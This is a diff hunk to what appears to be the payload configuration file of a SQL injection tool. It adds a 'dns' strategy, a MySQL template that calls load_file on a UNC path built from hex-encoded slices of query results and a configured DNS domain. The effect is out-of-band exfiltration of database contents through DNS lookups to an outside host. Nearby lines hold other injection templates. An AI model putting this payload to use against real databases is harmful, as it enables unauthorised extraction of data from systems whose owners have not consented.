@@ -293,6 +293,17 @@ strategy:
   orderBy: order by 1337
 
  stack: ; select ${window}
+ dns: |
+  ${binary.mode} 1=(
+      select load_file(
+          concat(
+              '\\\\${dns.random}.', 
+              /* limit to only 14 chars for unicode oversize */
+              hex(mid(${window}, 1, 14)), 
+              '.${dns.random}.${dns.domain}.\\path'
+          )
+      )
+  )
 
  binary:
   test:
